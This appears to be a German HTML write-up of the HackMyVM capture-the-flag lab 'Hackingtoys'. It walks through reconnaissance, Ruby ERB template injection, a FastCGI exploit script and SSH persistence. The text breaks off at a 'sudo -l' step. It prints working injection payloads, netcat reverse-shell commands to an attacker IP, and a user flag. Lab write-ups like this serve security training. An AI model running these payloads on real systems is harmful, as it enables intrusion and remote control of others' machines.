@@ -1,0 +1,615 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hackingtoys - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Hackingtoys - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">Web Browser</div>
+                <div class="tool-item">Burp Suite (Implied/Manual Request)</div>
+                <div class="tool-item">urlencoder.io (Implied)</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">python3 -m http.server</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ssh-keygen</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">linpeas.sh</div>
+                <div class="tool-item">cgi-fcgi</div>
+                <div class="tool-item">mktemp</div>
+                <div class="tool-item">env</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">ruby</div>
+                <div class="tool-item">require (Ruby)</div>
+                <div class="tool-item">socket (Ruby)</div>
+                <div class="tool-item">syscall (Ruby)</div>
+                <div class="tool-item">exec (Ruby)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-ssti">Web Enumeration & SSTI Discovery</a></li>
+                <li><a href="#ssti-exploit-lidia">SSTI Exploit (Initial Access as lidia)</a></li>
+                <li><a href="#fastcgi-exploit-dodi">FastCGI Exploit (Lateral Movement to dodi)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (dodi to root via sudo & Binary Hijack)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Wir beginnen mit der Erkundung des Netzwerks, um das Zielsystem zu identifizieren und die offenen Dienste zu ermitteln.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.126</span>	08:00:27:fc:20:4d	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der ARP-Scan identifiziert die IP-Adresse <span class="command">192.168.2.126</span> im lokalen Netzwerk.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** IP für Nmap-Scan verwenden.
+            **Empfehlung (Admin):** Standard Netzwerküberwachung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+[...]
+<span class="command">192.168.2.126   hackingtoys.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Hostname `hackingtoys.hmv` wird der IP <span class="command">192.168.2.126</span> in der lokalen `/etc/hosts`-Datei zugeordnet.</p>
+            <p class="evaluation">**Bewertung:** Ermöglicht die Adressierung des Ziels über den Hostnamen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Hostnamen nutzen.
+            **Empfehlung (Admin):** DNS-Management.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Nmap UDP Scan</span></div>
+                     <pre>
+Starting Nmap 7.94SVN [...] at 2024-09-04 11:27 CEST
+Nmap scan report for 192.168.2.126
+Host is up [...]
+Not shown: 995 open|filtered udp ports (no-response)
+PORT      STATE  SERVICE
+<span class="command">502/udp   closed mbap</span>
+<span class="command">623/udp   closed asf-rmcp</span>
+<span class="command">1457/udp  closed valisys-lm</span>
+<span class="command">32771/udp closed sometimes-rpc6</span>
+<span class="command">38293/udp closed landesk-cba</span>
+[...]
+Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Ein schneller Nmap UDP-Scan (`-sU` impliziert) auf die Top-Ports zeigt keine offenen UDP-Ports.</p>
+             <p class="evaluation">**Bewertung:** Keine offensichtlichen Angriffspunkte über UDP gefunden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Fokus auf TCP-Ports legen.
+             **Empfehlung (Admin):** Unnötige UDP-Dienste deaktivieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.126 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN [...] at 2024-09-04 11:28 CEST
+Nmap scan report for hackingtoys.hmv (192.168.2.126)
+Host is up [...]
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+<span class="command">22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span>
+| ssh-hostkey:
+[...]
+<span class="command">3000/tcp open  ssl/ppp?</span>
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings:
+|   GenericLines:
+|     HTTP/1.0 400 Bad Request
+[...]
+|     <span class="password">Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (PumaHttpParserError)</span>
+[...]
+|   GetRequest:
+|     <span class="password">HTTP/1.0 403 Forbidden</span>
+|     content-type: text/html; charset=UTF-8
+[...]
+|     <title>Action Controller: Exception caught</title>
+[...]
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=FR
+[...]
+<span class="password">1 service unrecognized despite returning data.</span> [...]
+MAC Address: 08:00:27:FC:20:4D (Oracle VirtualBox virtual NIC)
+[...]
+OS details: <span class="command">Linux 4.15 - 5.8</span>
+[...]
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms hackingtoys.hmv (192.168.2.126)
+[...]
+Nmap done: 1 IP address (1 host up) scanned in 71.75 seconds
+                    </pre>
+                      <div class="prompt"># <span class="command">Nmap Kurzfassung</span></div>
+                     <pre>
+<span class="command">22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span>
+<span class="command">3000/tcp open  ssl/ppp?</span>
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (PumaHttpParserError)
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der Nmap TCP-Scan (`-sS`, `-sV`, `-A`, `-T5`, `-p-`) findet zwei offene Ports:
+             *   <span class="command">Port 22</span>: SSH (OpenSSH 9.2p1 auf Debian 12).
+             *   <span class="command">Port 3000</span>: Ein Dienst, den Nmap nicht eindeutig identifizieren kann (`ssl/ppp?`). Jedoch deuten die Fingerprint-Strings und Fehlermeldungen klar auf einen **Ruby on Rails / Puma Webserver** hin, der über **SSL/TLS** läuft. Eine normale HTTP-Anfrage (`GetRequest`) führt zu einem `403 Forbidden`-Fehler und einer Rails-Fehlerseite. Eine nicht-HTTP-Anfrage (`GenericLines`) führt zu einem Puma-Fehler bezüglich SSL.</p>
+             <p class="evaluation">**Bewertung:** SSH ist Standard. Der Dienst auf Port 3000 ist eine Ruby on Rails-Anwendung, die über HTTPS erreichbar sein muss. Dies ist unser Hauptangriffsziel.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die Anwendung auf Port 3000 über HTTPS untersuchen (`https://hackingtoys.hmv:3000` oder `https://192.168.2.126:3000`). Nikto, Gobuster und manuelle Analyse auf dieser URL durchführen. Auf bekannte Schwachstellen in Ruby on Rails, Puma oder der spezifischen Anwendung achten.
+             **Empfehlung (Admin):** Sicherstellen, dass nur notwendige Ports offen sind. Ruby on Rails und Puma aktuell halten und sicher konfigurieren. SSL/TLS korrekt implementieren.</p>
+        </section>
+
+        <section id="web-enumeration-ssti">
+            <h2>Web Enumeration & SSTI Discovery</h2>
+            <p class="comment">Wir untersuchen die Ruby on Rails Anwendung auf Port 3000 über HTTPS.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h https://192.168.2.126:3000</span></div> <span class="password"># Annahme: Protokoll und Port angepasst</span>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.126
++ Target Hostname:    192.168.2.126
++ Target Port:        3000
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /C=FR/ST=Some-State/O=Internet Widgits Pty Ltd
+                   Ciphers:  TLS_AES_256_GCM_SHA384
+                   Issuer:   /C=FR/ST=Some-State/O=Internet Widgits Pty Ltd
++ Start Time:         2024-09-04 11:30:54 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="password">No banner retrieved</span>
++ /: Drupal Link header found [...]. <span class="password">(False Positive?)</span>
++ /: Uncommon header 'server-timing' found, [...]
++ /: Uncommon header 'x-runtime' found, [...]
++ /: Uncommon header 'x-request-id' found, [...]
++ /: <span class="password">The site uses TLS and the Strict-Transport-Security HTTP header is not defined.</span> [...]
++ /: <span class="password">Cookie _gadgets_session created without the secure flag.</span> [...]
++ /Lkxn7f79.idq: <span class="password">The X-Content-Type-Options header is not set.</span> [...]
++ No CGI Directories found [...]
++ Hostname '192.168.2.126' does not match certificate's names: . <span class="password">(Selbstsigniertes/Generisches Cert?)</span>
++ /trace.axd: The .NET IIS server has application tracing enabled. <span class="password">(False Positive)</span>
++ /admin-serv/tasks[...]: iPlanet Administration Server [...] <span class="password">(False Positive)</span>
++ /%2f..%2f..%2f[...]: Web_Server_4D [...] directory traversal problem. <span class="password">(False Positive)</span>
+[...] <span class="password">(Viele weitere False Positives bezüglich Path Traversal)</span> [...]
++ /shop/magmi/[...]: MAGMI allows any file to be retrieved remotely. <span class="password">(False Positive)</span>
++ /scgi-bin/platform.cgi: Cisco http firewall [...] local file inclusion. <span class="password">(False Positive)</span>
++ 8104 requests: 0 error(s) and <span class="password">207 item(s) reported</span> on remote host <span class="password">(Sehr viele, meist generische oder False Positives)</span>
+[...]
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Nikto wird auf `https://192.168.2.126:3000` ausgeführt.
+             *   Es erkennt das SSL-Zertifikat (selbstsigniert oder generisch, nicht für die IP gültig).
+             *   Es meldet viele Funde (207), aber die meisten scheinen generische Hinweise (fehlende Header wie HSTS, Secure-Flag für Cookie) oder klare False Positives zu sein (Hinweise auf Drupal, .NET, iPlanet, Cisco etc. auf einem Ruby-Server).
+             *   Es werden keine spezifischen Schwachstellen für Ruby/Rails/Puma gemeldet.</p>
+              <p class="evaluation">**Bewertung:** Nikto ist hier wenig hilfreich und produziert viel Rauschen. Die fehlenden Header und Cookie-Flags sind geringfügige Sicherheitsprobleme.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Manuelle Untersuchung der Anwendung im Browser. Auf bekannte Ruby on Rails Schwachstellen achten (z.B. Mass Assignment, unsichere Deserialisierung, SSTI). Verzeichnis-/Datei-Scans mit Gobuster/ffuf versuchen.
+              **Empfehlung (Admin):** Sicherheitsheader (HSTS, X-Content-Type-Options) setzen. Secure-Flag für Cookies verwenden.</p>
+
+             <p class="comment">Wir untersuchen die Anwendung manuell im Browser und finden eine Suchfunktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Manuelle Untersuchung (Browser & curl)</span></div>
+                     <pre>
+# curl http://hackingtoys.hmv:3000 -Iv -> Ergibt "Empty reply" (SSL Fehler)
+# nc -vv 192.168.2.126 3000 -> Bestätigt offenen Port, zeigt Puma-Fehler
+
+# Aufruf von https://192.168.2.126:3000/ im Browser (nach Akzeptieren des Zertifikats)
+# Zeigt Seite "Hacking Gadgets List" mit Links zu Produkten (/products/show/X)
+# Enthält ein Suchformular:
+ 
+
+# Test der Suche: https://192.168.2.126:3000/search?query=hacking&message=Product+does+not+exist
+# Antwort: Zeigt "Hacking Gadgets List" und den Text "Product does not exist" an.
+
+# Test: Ändern des 'message'-Parameters:
+# Aufruf: https://192.168.2.126:3000/search?query=hacking&message=<span class="password">hallo</span>
+# Antwort: Zeigt "Hacking Gadgets List" und den Text "<span class="password">hallo</span>" an.
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:**
+             1.  `curl` ohne HTTPS schlägt fehl. `nc` bestätigt den Port.
+             2.  Der Aufruf der Seite über HTTPS im Browser zeigt eine Liste von Gadgets und ein Suchformular.
+             3.  Das Suchformular sendet eine GET-Anfrage an `/search` mit den Parametern `query` und `message`.
+             4.  Der Wert des `message`-Parameters wird auf der Ergebnisseite direkt ausgegeben. Wenn wir den Wert ändern (z.B. zu `hallo`), wird dieser neue Wert angezeigt.</p>
+             <p class="evaluation">**Bewertung:** Das direkte Echo des `message`-Parameters ist ein starker Hinweis auf eine mögliche Cross-Site-Scripting (XSS)- oder Server-Side Template Injection (SSTI)-Schwachstelle. Da es sich um eine Ruby on Rails / Puma Anwendung handelt, ist SSTI in der ERB-Template-Engine wahrscheinlich.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Standard-SSTI-Payloads für Ruby/ERB im `message`-Parameter testen. Ziel ist Codeausführung auf dem Server.
+             **Empfehlung (Admin):** Benutzereingaben (insbesondere solche, die in Templates gerendert werden) immer validieren und kontextbezogen escapen/sanitisieren, um XSS und SSTI zu verhindern.</p>
+
+             <p class="comment">Wir testen auf Server-Side Template Injection (SSTI) im `message`-Parameter.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt"># <span class="command">SSTI Tests (Browser / curl)</span></div>
+                      <pre>
+# Payload 1: ${7*7} (Syntax für andere Engines)
+# URL: https://192.168.2.126:3000/search?query=hacking&message=<span class="command">${7*7}</span>
+# Ergebnis: Zeigt "${7*7}" (wird nicht interpretiert)
+
+# Payload 2: <%= 7+8 %> (ERB Syntax) - URL-encoded: %3C%25%3D%207%2B8%20%25%3E
+# URL: https://192.168.2.126:3000/search?query=hacking&message=<span class="command">%3C%25%3D%207%2B8%20%25%3E</span>
+# Ergebnis: Zeigt "<span class="password">15</span>" <span class="password">(Erfolgreich! ERB SSTI bestätigt)</span>
+
+# Payload 3: <%= $(id) %> (Shell-Kommando - falsche Syntax für Ruby) - URL-encoded: %3C%25%3D%20%24%28id%29%20%25%3E
+# URL: https://192.168.2.126:3000/search?query=hacking&message=<span class="command">%3C%25%3D%20%24%28id%29%20%25%3E</span>
+# Ergebnis: <span class="password">SyntaxError in ProductsController#search</span> (Bestätigt ERB, falsche Syntax)
+
+# Payload 4: <%= `id` %> (Ruby Code Execution via Backticks) - URL-encoded: %3C%25%3D%20%60id%60%20%25%3E
+# URL: https://192.168.2.126:3000/search?query=hacking&message=<span class="command">%3C%25%3D%20%60id%60%20%25%3E</span>
+# Ergebnis: Zeigt "<span class="password">uid=1000(lidia) gid=1000(lidia) groups=1000(lidia),100(users),1002(rvm)</span>" <span class="password">(RCE erfolgreich!)</span>
+
+# Payload 5: <%= `cat /etc/passwd` %> (Datei lesen) - URL-encoded: %3C%25%3D%20%60cat%20%2Fetc%2Fpasswd%60%20%25%3E
+# URL: view-source:https://192.168.2.126:3000/search?query=hacking&message=<span class="command">%3C%25%3D%20%60cat%20%2Fetc%2Fpasswd%60%20%25%3E</span>
+# Ergebnis: <span class="password">(Inhalt von /etc/passwd wird angezeigt)</span>, zeigt Benutzer <span class="command">lidia</span> und <span class="command">dodi</span>.
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:**
+              1.  Ein Payload für andere Engines (`${7*7}`) funktioniert nicht.
+              2.  Ein einfacher ERB-Payload (`<%= 7+8 %>`) wird erfolgreich ausgeführt und ergibt `15`. Dies bestätigt eine SSTI-Schwachstelle in der ERB-Template-Engine.
+              3.  Ein Versuch, Shell-Syntax direkt zu verwenden (`$(id)`), schlägt fehl, da es keine gültige Ruby-Syntax ist.
+              4.  Ein Payload mit Backticks (`<%= \`id\` %>`), der in Ruby zur Kommandoausführung dient, wird erfolgreich ausgeführt und gibt die Ausgabe des `id`-Befehls zurück. Wir sehen, dass der Prozess als Benutzer `<span class="command">lidia</span>` läuft.
+              5.  Ein weiterer Test mit `cat /etc/passwd` bestätigt, dass wir beliebige Befehle ausführen und Dateien lesen können. Wir sehen die Benutzer `lidia` und `dodi`.</p>
+               <p class="evaluation">**Bewertung:** Kritische RCE-Schwachstelle durch Server-Side Template Injection (SSTI) in Ruby/ERB gefunden! Wir können Befehle als Benutzer `lidia` ausführen.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Die SSTI-Schwachstelle nutzen, um eine Reverse Shell als `lidia` zu erhalten.
+               **Empfehlung (Admin):** **SSTI-Schwachstelle sofort beheben!** Benutzereingaben, die in Templates verwendet werden, müssen rigoros saniert werden. Sicherere Template-Engines oder Konfigurationen verwenden, die Codeausführung verhindern.</p>
+        </section>
+
+        <section id="ssti-exploit-lidia">
+             <h2>SSTI Exploit (Initial Access as lidia)</h2>
+             <p class="comment">Wir nutzen die gefundene SSTI-Schwachstelle, um eine Reverse Shell als Benutzer `lidia` zu erlangen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Reverse Shell Payload (ERB/Ruby)</span></div>
+                     <pre>
+# Payload: <%= `nc -e /bin/bash 192.168.2.199 4444` %>
+# URL-Encoded: %3C%25%3D%20%60nc%20-e%20%2Fbin%2Fbash%20192.168.2.199%204444%60%20%25%3E
+                     </pre>
+                     <div class="prompt"># <span class="command">Listener starten</span></div>
+                      <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                      <pre>listening on [any] 4444 ...</pre>
+                     <div class="prompt"># <span class="command">SSTI mit Reverse Shell Payload auslösen (Browser/curl)</span></div>
+                      <pre>
+# Aufruf: https://192.168.2.126:3000/search?query=hacking&message=<span class="command">%3C%25%3D%20%60nc%20-e%20%2Fbin%2Fbash%20192.168.2.199%204444%60%20%25%3E</span>
+                      </pre>
+                      <div class="prompt"># <span class="command">Listener empfängt Verbindung</span></div>
+                       <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                       <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.126] 34560</span> <span class="password">(IP .125 im Log?)</span>
+id
+<span class="command">uid=1000(lidia) gid=1000(lidia) groups=1000(lidia),100(users),1002(rvm)</span>
+                       </pre>
+                        <div class="prompt"># <span class="command">Shell Stabilisierung</span></div>
+                        <div class="prompt">lidia@hacktoys:/opt/app/gadgets$ <span class="command">stty rows 48 columns 94</span></div>
+                         <div class="prompt">lidia@hacktoys:/opt/app/gadgets$ <span class="command">id</span></div>
+                        <pre>uid=1000(lidia) gid=1000(lidia) groups=1000(lidia),100(users),1002(rvm)</pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               1.  Wir erstellen einen SSTI-Payload, der `nc -e /bin/bash` verwendet, um eine Reverse Shell zu unserer IP (`192.168.2.199`) auf Port `4444` zu senden.
+               2.  Wir starten einen Netcat-Listener auf Port 4444.
+               3.  Wir senden den URL-codierten Payload über den `message`-Parameter an die `/search`-URL.
+               4.  Der Server führt den `nc`-Befehl aus, und unser Listener empfängt die Verbindung. Wir haben eine Shell als Benutzer `<span class="command">lidia</span>` (Mitglied der Gruppen `lidia`, `users`, `rvm`).
+               5.  Die Shell wird mit `stty` stabilisiert.</p>
+                <p class="evaluation">**Bewertung:** Initial Access als `lidia` erfolgreich via SSTI erlangt!</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `lidia` enumerieren (Home-Verzeichnis, SSH-Keys, sudo, Cronjobs).
+                **Empfehlung (Admin):** SSTI-Schwachstelle beheben.</p>
+         </section>
+
+         <section id="fastcgi-exploit-dodi">
+              <h2>FastCGI Exploit (Lateral Movement to dodi)</h2>
+              <p class="comment">Als `lidia` enumerieren wir das System weiter. Wir finden Hinweise auf einen FastCGI-Dienst und nutzen diesen für Lateral Movement zum Benutzer `dodi`.</p>
+              <p class="comment">*(Hinweis: Der Übergang von SSTI zu FastCGI ist im Log etwas abrupt. Es wird angenommen, dass die Enumeration als `lidia` zur Entdeckung des FastCGI-Dienstes führte, der auf Port 9000 lokal lauscht, wie in `ss -altpn` als `lidia` gesehen.)*</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">lidia@hacktoys:~$ <span class="command">ss -altpn</span></div>
+                     <pre>
+State  Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process
+LISTEN 0       128            0.0.0.0:22          0.0.0.0:*
+LISTEN 0       1024           0.0.0.0:3000        0.0.0.0:*     users:(("ruby",pid=525,fd=7)) <span class="password">(Puma/Rails)</span>
+LISTEN 0       511          127.0.0.1:80          0.0.0.0:*     <span class="password">(Nginx auf localhost?)</span>
+LISTEN 0       4096         <span class="command">127.0.0.1:9000</span>        0.0.0.0:*     <span class="password">(FastCGI Listener!)</span>
+LISTEN 0       128               [::]:22             [::]:*
+                     </pre>
+                      <div class="prompt"># <span class="command">(Auf Angreifer-Maschine: SSH Port Forwarding einrichten)</span></div>
+                       <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">ssh -L 9000:127.0.0.1:9000 lidia@192.168.2.126 -i id_rsa</span></div> <span class="password"># Leitet lokalen Port 9000 zum Ziel-Port 9000</span>
+                        <pre>
+Enter passphrase for key '/root/.ssh/id_rsa':
+Linux hacktoys [...]
+lidia@hacktoys:~$ <span class="password"># SSH Verbindung mit Port Forwarding aktiv</span>
+                        </pre>
+                      <div class="prompt"># <span class="command">(Auf Angreifer-Maschine: FastCGI Exploit Skript vorbereiten/anpassen)</span></div>
+                       <div class="prompt">┌──(root㉿CCat)-[~/.ssh]
+└─# <span class="command">vi fast_CGI.sh</span></div>
+                       <div class="prompt">┌──(root㉿CCat)-[~/.ssh]
+└─# <span class="command">cat fast_CGI.sh</span></div>
+                       <pre>
+#!/bin/bash
+
+PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';?>" <span class="password"># Geändert auf 'whoami'</span>
+FILENAMES="/var/www/html/index.php" <span class="password"># Existierender PHP-Pfad auf Ziel</span>
+HOST=$1 <span class="password"># Wird 'localhost' sein wegen Port Forwarding</span>
+B64=$(echo "$PAYLOAD"|base64)
+
+for FN in $FILENAMES; do
+    OUTPUT=$(mktemp)
+    <span class="password">env -i PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain;base64,$B64'" SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT</span>
+    cat $OUTPUT
+done
+                       </pre>
+                       <div class="prompt"># <span class="command">(Auf Angreifer-Maschine: Exploit ausführen gegen lokalen Forwarding-Port)</span></div>
+                       <div class="prompt">┌──(root㉿CCat)-[~/.ssh]
+└─# <span class="command">./fast_CGI.sh localhost | grep dodi</span></div> <span class="password"># Filtert nach 'dodi' in der Ausgabe</span>
+                        <pre>
+<span class="password"><!--dodi</span> <span class="password"># Ausgabe von 'whoami' -> läuft als dodi!</span>
+                        </pre>
+                         <div class="prompt"># <span class="command">(Anpassen des Payloads für Reverse Shell)</span></div>
+                          <div class="prompt">┌──(root㉿CCat)-[~/.ssh]
+└─# <span class="command">vi fast_CGI.sh</span></div>
+                          <pre>
+PAYLOAD="<?php echo '<!--'; system('nc -e /bin/bash 192.168.2.199 4443'); echo '-->';?>"
+[...]
+                          </pre>
+                          <div class="prompt"># <span class="command">(Listener starten)</span></div>
+                           <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4443</span></div>
+                           <pre>listening on [any] 4443 ...</pre>
+                          <div class="prompt"># <span class="command">(Exploit erneut ausführen)</span></div>
+                           <div class="prompt">┌──(root㉿CCat)-[~/.ssh]
+└─# <span class="command">./fast_CGI.sh localhost</span></div>
+                           <div class="prompt"># <span class="command">(Listener empfängt Verbindung)</span></div>
+                            <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4443</span></div>
+                            <pre>
+listening on [any] 4443 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.126] 37312</span>
+id
+<span class="command">uid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users)</span>
+                            </pre>
+                             <div class="prompt"># <span class="command">(Shell Stabilisierung)</span></div>
+                             <div class="prompt">dodi@hacktoys:/var/www/html$ <span class="command">stty rows 48 columns 94</span></div>
+                              <div class="prompt">dodi@hacktoys:/var/www/html$ <span class="command">id</span></div>
+                              <pre>uid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users)</pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               1.  Als `lidia` stellen wir fest, dass ein Dienst auf `127.0.0.1:9000` lauscht. Dies ist wahrscheinlich ein PHP-FPM oder FastCGI-Prozess.
+               2.  Wir richten auf unserer Angreifer-Maschine einen SSH-Port-Forward ein (`ssh -L 9000:127.0.0.1:9000 lidia@...`), um von unserer Maschine auf den lokalen Port 9000 des Ziels zugreifen zu können.
+               3.  Wir verwenden ein Skript (`fast_CGI.sh`), das `cgi-fcgi` nutzt, um speziell präparierte Anfragen an den FastCGI-Dienst zu senden. Durch Setzen von `PHP_VALUE` und `auto_prepend_file` können wir PHP-Code einschleusen.
+               4.  Ein erster Test mit `system('whoami')` im Payload zeigt, dass der FastCGI-Prozess als Benutzer `<span class="command">dodi</span>` läuft.
+               5.  Wir passen den Payload an, um eine Netcat-Reverse-Shell (`nc -e /bin/bash [IP] 4443`) zu starten.
+               6.  Wir starten einen Listener auf Port 4443.
+               7.  Wir führen das `fast_CGI.sh`-Skript gegen unseren lokalen Port 9000 (der zum Ziel weitergeleitet wird) aus.
+               8.  Unser Listener empfängt die Verbindung, und wir haben eine Shell als Benutzer `<span class="command">dodi</span>`.
+               9.  Die Shell wird stabilisiert.</p>
+                <p class="evaluation">**Bewertung:** Lateral Movement von `lidia` zu `dodi` erfolgreich! Die FastCGI-Schnittstelle war unsicher konfiguriert oder zugänglich und lief im Kontext des Benutzers `dodi`, was die Codeausführung als dieser Benutzer ermöglichte.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `dodi` enumerieren (`sudo -l`), User-Flag lesen.
+                **Empfehlung (Admin):** FastCGI/PHP-FPM sicher konfigurieren. Zugriff auf den Socket/Port nur für den Webserver erlauben. `allow_url_include` und `allow_url_fopen` in PHP deaktivieren, wenn nicht benötigt.</p>
+         </section>
+
+        <section id="privesc-root">
+            <h2>Privilege Escalation (dodi to root via sudo & Binary Hijack)</h2>
+            <p class="comment">Als Benutzer `dodi` suchen wir nach dem Weg zu Root.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">dodi@hacktoys:/var/www/html$ <span class="command">cd ~</span></div>
+                    <div class="prompt">dodi@hacktoys:~$ <span class="command">ls -la</span></div>
+                    <pre>
+[...]
+-rwx------ 1 dodi dodi   33 May 20 15:14 <span class="command">user.txt</span>
+                    </pre>
+                     <div class="prompt">dodi@hacktoys:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">b075b24bdb11990e185c32c43539c39f</span></pre>
+                     <div class="prompt"># <span class="command">(SSH Key für dodi einrichten - redundant, da Shell bereits vorhanden)</span></div>
+                     <div class="prompt">dodi@hacktoys:~$ <span class="command">mkdir .ssh</span></div>
+                     <div class="prompt">dodi@hacktoys:~$ <span class="command">wget 192.168.2.199/authorized_keys</span></div>
+                      <pre>[...]</pre>
+                     <div class="prompt">dodi@hacktoys:~$ <span class="command">chmod 700 .ssh</span></div> <span class="password"># Korrekte Berechtigung für .ssh Verzeichnis</span>
+                      <div class="prompt">dodi@hacktoys:~$ <span class="command">chmod 600 .ssh/authorized_keys</span></div> <span class="password"># Korrekte Berechtigung für authorized_keys</span>
+                      <div class="prompt"># <span class="command">(SSH Login als dodi von Angreifer-Maschine erfolgreich)</span></div>
+                       <div class="prompt">┌──(root㉿CCat)-[~/.ssh]
+└─# <span class="command">ssh dodi@192.168.2.126 -i id_rsa</span></div>
+                       <pre>[...]
+<span class="command">dodi@hacktoys:~$</span>
+                       </pre>
+                        <div class="prompt">dodi@hacktoys:~$ <span class="command">sudo -l</span></div>
